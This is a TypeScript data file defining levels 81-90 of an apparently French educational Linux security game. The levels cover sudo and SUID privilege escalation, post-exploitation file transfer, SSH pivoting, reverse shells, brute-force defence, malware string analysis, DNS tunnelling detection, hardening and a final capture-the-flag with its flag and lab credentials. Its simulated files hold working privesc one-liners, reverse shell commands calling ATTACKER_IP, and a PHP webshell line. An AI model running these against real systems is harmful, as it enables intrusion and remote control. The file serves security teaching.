import type { Level } from './_types';

export const levels81_90: Level[] = [
  // levels 81-90 (originally 71-80, renumbered)
  {
    id: 81,
    title: "Élévation de privilèges — Sudo",
    difficulty: 'advanced',
    category: "PrivEsc",
    objective: "Exploiter une mauvaise configuration sudo pour obtenir root",
    description: "`sudo -l` liste ce que l'utilisateur peut exécuter avec sudo. Si un binaire est autorisé sans mot de passe (`NOPASSWD`) et permet d'exécuter du code, il peut être utilisé pour obtenir un shell root (cf. GTFOBins).",
    commands: ['sudo'],
    hints: [
      "`sudo -l` — affiche tes permissions sudo.",
      "Un `(ALL) NOPASSWD: /usr/bin/vim` = tu peux exécuter vim en root, donc ouvrir un shell.",
      "GTFOBins (gtfobins.github.io) liste les binaires exploitables via sudo."
    ],
    fileSystem: {
      'sudo_analysis.txt': `sudo -l → résultat :
User student may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less

Exploitation via 'find' (GTFOBins) :
  sudo find . -exec /bin/bash \\; -quit
  → shell root immédiat

Exploitation via 'less' :
  sudo less /etc/passwd
  puis taper : !/bin/bash
  → shell root

Moral : sudo NOPASSWD sur des binaires capables d'exécuter du code = privesc triviale.`,
      'gtfobins_ref.txt': `Binaires exploitables courants (sudo):
  find    : sudo find . -exec /bin/sh \\;
  vim     : sudo vim -c ':!/bin/sh'
  python  : sudo python -c 'import os; os.system("/bin/sh")'
  perl    : sudo perl -e 'exec "/bin/sh"'
  awk     : sudo awk 'BEGIN {system("/bin/sh")}'
  nmap    : sudo nmap --interactive (vieilles versions)`
    },
    validation: [
      { type: 'command', value: 'sudo -l', description: 'Lister les permissions sudo de l\'utilisateur' }
    ],
    story: "⬆️ Tu as un accès limité sur la machine. `sudo -l` te réserve peut-être une surprise."
  },
  {
    id: 82,
    title: "Élévation de privilèges — SUID avancé",
    difficulty: 'advanced',
    category: "PrivEsc",
    objective: "Trouver et exploiter un binaire SUID non standard",
    description: "`find / -perm -4000 -type f 2>/dev/null` liste tous les binaires SUID. Les binaires SUID *standards* (passwd, su) sont attendus. Un binaire SUID *non standard* (cp, vim, bash) est exploitable pour lire des fichiers protégés ou obtenir root.",
    commands: ['find', 'ls'],
    hints: [
      "`find / -perm -4000 -type f 2>/dev/null` — liste les SUID sur tout le système.",
      "Compare avec une liste de SUID standards : tout ce qui n'est pas attendu est suspect.",
      "`/bin/bash` avec SUID root : `bash -p` ouvre un shell root (preserved privileges)."
    ],
    fileSystem: {
      'suid_found.txt': `Binaires SUID trouvés (find / -perm -4000) :
/usr/bin/passwd       ← standard (changer son mot de passe)
/usr/bin/su           ← standard
/usr/bin/sudo         ← standard
/bin/ping             ← standard
/usr/bin/python3      ← NON STANDARD ⚠️
/usr/local/bin/backup ← NON STANDARD ⚠️
/bin/bash             ← NON STANDARD ⚠️ CRITIQUE

Exploitation /bin/bash SUID root :
  bash -p
  → whoami retourne "root"

Exploitation /usr/bin/python3 SUID :
  python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
    },
    validation: [
      { type: 'command', value: 'find / -perm -4000', description: 'Lister tous les binaires SUID' }
    ],
    story: "🔓 Un développeur a mis le bit SUID sur un mauvais binaire. Une commande `find` bien construite suffit à le repérer."
  },
  {
    id: 83,
    title: "Transfert de fichiers — Techniques offensives",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Transférer des outils sur une machine compromise",
    description: "Après un accès initial, il faut souvent transférer des outils. Méthodes : `wget`, `curl`, `python -m http.server` (serveur HTTP), `nc` (netcat), base64 (encode puis decode). Chaque méthode a ses avantages selon ce qui est disponible.",
    commands: ['wget', 'curl', 'python3', 'nc', 'base64'],
    hints: [
      "Méthode 1 — HTTP : `python3 -m http.server 8080` sur l'attaquant, `wget http://IP:8080/tool` sur la cible.",
      "Méthode 2 — base64 : `base64 tool > tool.b64`, copie le texte, puis `base64 -d tool.b64 > tool` sur la cible.",
      "Méthode 3 — netcat : `nc -l -p 4444 < tool` attaquant, `nc 192.168.1.100 4444 > tool` cible."
    ],
    fileSystem: {
      'transfer_methods.txt': `Méthodes de transfert de fichiers (post-exploitation) :

1. HTTP Server (Python)
   Attaquant : python3 -m http.server 8080
   Cible      : wget http://attacker:8080/linpeas.sh

2. Netcat
   Attaquant : nc -l -p 4444 < linpeas.sh
   Cible      : nc 10.10.14.1 4444 > linpeas.sh

3. Base64 (si seulement accès texte)
   Attaquant : base64 linpeas.sh
   Cible      : echo "BASE64..." | base64 -d > linpeas.sh
   Cible      : chmod +x linpeas.sh && ./linpeas.sh

4. SCP (si SSH dispo)
   scp linpeas.sh user@target:/tmp/

5. /dev/tcp (bash pur, pas de binaires)
   cat linpeas.sh > /dev/tcp/attacker/4444`
    },
    validation: [
      { type: 'command', value: 'wget', description: 'Télécharger un outil via HTTP' },
      { type: 'command', value: 'base64 -d', description: 'Décoder un transfert base64' }
    ],
    story: "📤 Tu as un shell sur la machine cible mais pas accès à `wget`. Quelles alternatives as-tu pour transférer linpeas.sh ?"
  },
  {
    id: 84,
    title: "Pivoting — Port Forwarding",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Accéder à un réseau interne via un hôte compromis",
    description: "Le pivoting utilise un hôte compromis comme relais vers un réseau autrement inaccessible. SSH local forwarding : `ssh -L port_local:cible_interne:port user@jump`. SOCKS proxy : `ssh -D 9050 user@jump` + proxychains.",
    commands: ['ssh'],
    hints: [
      "`ssh -L 3306:10.20.20.5:3306 student@jump.target.com` — accès à la BDD interne via localhost:3306.",
      "`ssh -D 9050 student@jump.target.com` — proxy SOCKS5 sur port 9050.",
      "Avec proxychains : `proxychains nmap 10.20.20.0/24` — scan du réseau interne via le tunnel."
    ],
    fileSystem: {
      'pivot_scenario.txt': `Topologie :
  Toi (10.10.14.1)
    │ Internet
    ▼
  jump.target.com (192.168.1.100) ← accès SSH obtenu
    │ Réseau interne (inaccessible depuis Internet)
    ├─ 10.20.20.5  : MySQL (port 3306)
    ├─ 10.20.20.10 : HTTP interne (port 80)
    └─ 10.10.10.1  : Management (port 22)

Objectif : accéder à MySQL sur 10.20.20.5:3306

Commande :
  ssh -L 3306:10.20.20.5:3306 student@jump.target.com -N
Résultat :
  mysql -h 127.0.0.1 -P 3306 -u root -p
  → connexion au MySQL interne !`
    },
    validation: [
      { type: 'command', value: 'ssh -L', description: 'Créer un tunnel de port forwarding local' }
    ],
    story: "🕳️ Tu contrôles un hôte en DMZ. Derrière, un réseau interne avec des bases de données. Le pivot SSH te donne accès."
  },
  {
    id: 85,
    title: "Reverse Shell — Détection et compréhension",
    difficulty: 'advanced',
    category: "Post-exploitation",
    objective: "Comprendre les reverse shells et leur détection",
    description: "Un reverse shell fait rappeler la machine cible vers l'attaquant. `bash -i >& /dev/tcp/IP/PORT 0>&1` est le one-liner bash classique. Côté défense : détecter des connexions sortantes inhabituelles vers des IPs externes sur des ports non standards.",
    commands: ['nc', 'ss', 'grep'],
    hints: [
      "Côté attaquant (listener) : `nc -l -p 4444` — attend la connexion.",
      "Côté défense : `ss -tnp | grep ESTAB` — connexions TCP établies + processus.",
      "Signe d'alerte : bash ou sh qui a une connexion réseau établie vers une IP externe."
    ],
    fileSystem: {
      'revshell_detection.txt': `Indicateurs de reverse shell actif :

1. Process avec connexion réseau :
   lsof -i -n -P | grep bash
   → bash PID 1337 TCP 10.0.0.5:4321->185.220.101.5:4444

2. ss / netstat :
   ss -tnp | grep ESTAB
   → ESTAB 0 0 10.0.0.5:4321 185.220.101.5:4444 users:(("bash",pid=1337))

3. Connexion sortante non standard :
   Port 4444, 1234, 9001 vers IP externe ≠ gateway habituelle

4. /proc/PID/fd :
   ls -la /proc/1337/fd
   → 0 → socket (stdin depuis réseau = reverse shell !)`,
      'revshell_oneliner.txt': `Reverse shells courants (à des fins éducatives — lab uniquement) :

Bash :
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Python :
  python3 -c 'import socket,subprocess,os;s=socket.socket();
  s.connect(("ATTACKER_IP",4444));
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
  subprocess.call(["/bin/bash","-i"])'

Netcat :
  nc -e /bin/bash ATTACKER_IP 4444

Tous ces patterns sont détectés par EDR/SIEM modernes.`
    },
    validation: [
      { type: 'command', value: 'ss -tnp', description: 'Détecter une connexion reverse shell active' },
      { type: 'command', value: 'cat revshell_detection.txt', description: 'Analyser les indicateurs de détection' }
    ],
    story: "🚨 Les IDS ont levé une alerte : connexion sortante inhabituelle depuis le serveur web. Reverse shell ? Analyse les connexions actives."
  },
  {
    id: 86,
    title: "Brute Force SSH — Compréhension & protection",
    difficulty: 'advanced',
    category: "Sécurité",
    objective: "Analyser une attaque brute-force et configurer fail2ban",
    description: "Hydra (`hydra -l root -P wordlist.txt ssh://IP`) automatise les tentatives de connexion. Côté défense : `fail2ban` bannit les IPs après N échecs. `fail2ban-client status sshd` affiche les IPs bannies.",
    commands: ['cat', 'grep'],
    hints: [
      "`cat /etc/fail2ban/jail.conf` — configuration du banissement (maxretry, bantime).",
      "`grep 'Ban' /var/log/fail2ban.log` — IPs bannies récemment.",
      "Une protection efficace : `maxretry=3, bantime=86400` + authentification par clé uniquement."
    ],
    fileSystem: {
      'fail2ban_config.txt': `# /etc/fail2ban/jail.local (configuration recommandée)
[DEFAULT]
maxretry = 3
bantime  = 86400   # 24h en secondes
findtime = 600     # fenêtre de détection : 10 min

[sshd]
enabled  = true
port     = ssh
filter   = sshd
logpath  = /var/log/auth.log
maxretry = 3

# État actuel : fail2ban-client status sshd
# Banned IPs : 185.220.101.5, 103.99.0.122, 45.33.32.156`,
      'hardening_ssh.txt': `Durcissement SSH recommandé (/etc/ssh/sshd_config) :

PermitRootLogin no          ← jamais root en SSH direct
PasswordAuthentication no   ← clés uniquement
MaxAuthTries 3              ← limiter les tentatives
AllowUsers student admin    ← whitelist d'utilisateurs
Protocol 2                  ← SSHv2 uniquement
X11Forwarding no
PermitEmptyPasswords no`
    },
    validation: [
      { type: 'command', value: 'cat fail2ban_config.txt', description: 'Lire la configuration fail2ban' },
      { type: 'command', value: 'grep Ban /var/log/fail2ban.log', description: 'Voir les IPs bannies' }
    ],
    story: "🔨 Le serveur subit 500 tentatives de connexion SSH par minute. Fail2ban est-il configuré correctement ?"
  },
  {
    id: 87,
    title: "Analyse de malware — Strings & comportement",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Extraire des indicateurs d'un fichier suspect avec strings",
    description: "`strings fichier` extrait toutes les chaînes de caractères lisibles d'un binaire. Indicateurs recherchés : URLs, IPs, noms de domaines, clés de registre Windows, chemins de fichiers, commandes système.",
    commands: ['strings', 'cat', 'grep'],
    hints: [
      "`strings malware.bin | grep -E 'http|https'` — extraire les URLs.",
      "`strings malware.bin | grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` — extraire les IPs.",
      "`strings malware.bin | grep -i 'password\\|passwd\\|pwd'` — recherche de mots-clés sensibles."
    ],
    fileSystem: {
      'strings_output.txt': `Sortie de : strings malware.bin

/bin/bash
/tmp/.x
curl
http://185.220.101.5:8080/gate.php
User-Agent: Mozilla/5.0
POST /api/collect
{"hostname":"%s","user":"%s","os":"Linux"}
/etc/passwd
/etc/shadow
id_rsa
authorized_keys
/var/www/html/.webshell.php
<?php system($_GET['cmd']); ?>
crontab -l
* * * * * /tmp/.x
XOR_KEY_0x42
AES-256-CBC`,
      'ioc_analysis.txt': `IOCs extraits de malware.bin :

Réseau :
  C2 : http://185.220.101.5:8080/gate.php
  Endpoint : POST /api/collect
  User-Agent suspect (légitime mais utilisé pour blend-in)

Système :
  Crée : /tmp/.x (persistance)
  Lit   : /etc/passwd, /etc/shadow, ~/.ssh/id_rsa
  Ajoute: crontab (* * * * * /tmp/.x)
  Dépose: /var/www/html/.webshell.php

Crypto : XOR + AES-256-CBC (obfuscation du trafic)`
    },
    validation: [
      { type: 'command', value: 'strings', description: 'Extraire les chaînes d\'un binaire suspect' },
      { type: 'command', value: 'cat ioc_analysis.txt', description: 'Analyser les IOCs identifiés' }
    ],
    story: "🦠 Un binaire suspect a été récupéré sur le serveur compromis. Que fait-il ? Extrais ses IOCs pour alimenter le SIEM."
  },
  {
    id: 88,
    title: "Tunnel DNS — Exfiltration avancée",
    difficulty: 'advanced',
    category: "Forensic",
    objective: "Détecter et analyser une exfiltration via DNS",
    description: "Le DNS tunneling encode des données dans des requêtes DNS pour exfiltrer/C2 en contournant les firewalls. Signes : requêtes vers des sous-domaines longs aléatoires, volume anormal de requêtes DNS, domaine inconnu non catégorisé.",
    commands: ['cat', 'grep', 'cut', 'sort'],
    hints: [
      "`cat dns_tunnel.log | grep -v 'google\\|cloudflare\\|microsoft'` — filtrer les DNS légitimes.",
      "`cut -d' ' -f5 dns_tunnel.log | cut -d. -f2- | sort | uniq -c | sort -rn` — domaines racines les plus contactés.",
      "Longueur anormale du sous-domaine (>30 chars) = souvent données encodées en base64/hex."
    ],
    fileSystem: {
      'dns_tunnel.log': `2024-01-15 14:00:01 client=192.168.1.50 query=google.com type=A
2024-01-15 14:00:05 client=192.168.1.50 query=github.com type=A
2024-01-15 14:01:00 client=192.168.1.50 query=aGVsbG93b3JsZA.tunnel.c2evil.xyz type=A
2024-01-15 14:01:01 client=192.168.1.50 query=dGhpcyBpcyBzZWNyZXQ.tunnel.c2evil.xyz type=A
2024-01-15 14:01:02 client=192.168.1.50 query=aW5mb3JtYXRpb24gZm9y.tunnel.c2evil.xyz type=A
2024-01-15 14:01:03 client=192.168.1.50 query=YXR0YWNrZXJzb25seQ.tunnel.c2evil.xyz type=A
2024-01-15 14:02:00 client=192.168.1.50 query=stackoverflow.com type=A
2024-01-15 14:03:00 client=192.168.1.50 query=dGhpcyBpcyBhIGRuc3Q.tunnel.c2evil.xyz type=A
2024-01-15 14:03:01 client=192.168.1.50 query=dW5uZWwgYXR0YWNr.tunnel.c2evil.xyz type=A`,
      'detection_tips.txt': `Détection DNS Tunneling :

1. Volume : >100 requêtes/min vers même domaine = suspect
2. Longueur subdomain : >25 chars aléatoires = encodage probable
3. Fréquence fixe : requête toutes les Xms = C2 heartbeat
4. Domaine inconnu non catégorisé dans threat intel

Outils de détection :
  - Zeek/Bro : analyse comportementale DNS
  - Suricata : règles signatures
  - PassiveDNS : baseline normale vs anomalies

Outils d'attaque (éducatif) :
  - iodine : DNS tunneling IPv4 over DNS
  - dnscat2 : C2 over DNS`
    },
    validation: [
      { type: 'command', value: 'grep c2evil dns_tunnel.log', description: 'Isoler les requêtes vers le domaine C2' },
      { type: 'command', value: 'cat detection_tips.txt', description: 'Analyser les méthodes de détection' }
    ],
    story: "📡 Le firewall ne bloque que HTTP/HTTPS. L'attaquant exfiltre via DNS. Prouve-le à partir des logs."
  },
  {
    id: 89,
    title: "Hardening Linux — Audit de configuration",
    difficulty: 'advanced',
    category: "Sécurité",
    objective: "Auditer la configuration d'un serveur avec une checklist",
    description: "Le hardening Linux réduilt la surface d'attaque : désactiver services inutiles, vérifier SSH, permissions, kernel parameters, comptes sans mot de passe. Outil de référence : `lynis` (audit automatisé).",
    commands: ['cat', 'grep', 'find', 'ss'],
    hints: [
      "`cat /etc/ssh/sshd_config | grep -E 'Root|Password|Auth'` — config SSH critique.",
      "`find / -name '*.conf' -readable -not -path '*/proc/*' 2>/dev/null` — fichiers de config lisibles.",
      "`ss -tulnp | grep '0.0.0.0'` — services exposés sur toutes interfaces."
    ],
    fileSystem: {
      'hardening_checklist.txt': `# Audit Hardening Linux — Checklist

[ ] SSH
    PermitRootLogin no ............. ❌ actuellement: yes
    PasswordAuthentication no ...... ✅
    MaxAuthTries 3 ................. ❌ actuellement: 6 (défaut)

[ ] Services inutiles
    Telnet installé ................ ❌ désinstaller
    FTP en clair ................... ❌ désinstaller
    NFS sans auth .................. ❌ à désactiver

[ ] Permissions
    /etc/passwd readable root ...... ✅
    /etc/shadow world-readable ..... ❌ chmod 640
    Fichiers SUID non standard ..... ❌ voir /usr/bin/python3

[ ] Kernel
    net.ipv4.ip_forward=0 .......... ✅ (routage désactivé)
    kernel.randomize_va_space=2 .... ✅ (ASLR actif)

[ ] Mises à jour
    Dernière MAJ système ........... 2023-06-15 ❌ (>6 mois)`,
      'lynis_score.txt': `Lynis audit score : 58/100

Hardening index: [####      ] 58%

Findings :
  [WARNING]  Found 3 world-writable directories
  [WARNING]  PermitRootLogin is set to yes
  [SUGGESTION] Install fail2ban
  [SUGGESTION] Enable automatic security updates`
    },
    validation: [
      { type: 'command', value: 'cat hardening_checklist.txt', description: 'Lire le rapport d\'audit hardening' },
      { type: 'command', value: 'cat lynis_score.txt', description: 'Analyser le score Lynis' }
    ],
    story: "🛡️ Avant de déployer ce serveur en production, réalise un audit de hardening. Le score actuel est insuffisant."
  },
  {
    id: 90,
    title: "CTF Final — Compromission complète",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Chaîne complète : recon → exploitation → privesc → proof",
    description: "Mission finale technique. Enchaîne toutes les phases d'un pentest : reconnaissance (nmap, dns), exploitation (header, service vulnérable), post-exploitation (SUID, sudo), preuve (cat /root/flag.txt).",
    commands: ['nmap', 'curl', 'ssh', 'find', 'sudo', 'cat'],
    hints: [
      "Phase 1 — Recon : `nmap -sV 10.0.0.99` — quels services ?",
      "Phase 2 — Enum web : `curl -I http://10.0.0.99` — version serveur ?",
      "Phase 3 — Accès : le fichier `creds.txt` contient des identifiants SSH.",
      "Phase 4 — PrivEsc : `sudo -l` après connexion.",
      "Phase 5 — Proof : `cat /root/flag.txt`"
    ],
    fileSystem: {
      'creds.txt': `Identifiants récupérés (phase d'enum) :
SSH → student:EduLinux2024!
Hôte : 10.0.0.99`,
      '/root/flag.txt': `FLAG{T3rm1n4l_W4rr10r_L3v3l_80}

Félicitations — tu as complété le parcours complet EduLinux.
Recon → Exploitation → Post-Exploitation → Forensic

Prochaine étape : HackTheBox, TryHackMe, Root-Me`
    },
    validation: [
      { type: 'command', value: 'nmap -sV', description: 'Phase 1 — Reconnaissance des services' },
      { type: 'command', value: 'curl -I http', description: 'Phase 2 — Énumération web' },
      { type: 'command', value: 'sudo -l', description: 'Phase 4 — Vérification des privilèges sudo' },
      { type: 'command', value: 'cat /root/flag.txt', description: 'Phase 5 — Capture du flag' }
    ],
    story: "🏁 MISSION FINALE — Compromission complète d'une machine. Recon → foothold → privesc → root. Démontre que tu maîtrises la chaîne d'attaque complète. Cette compétence s'exerce uniquement sur des labs autorisés (HTB, THM, Root-Me)."
  },
];
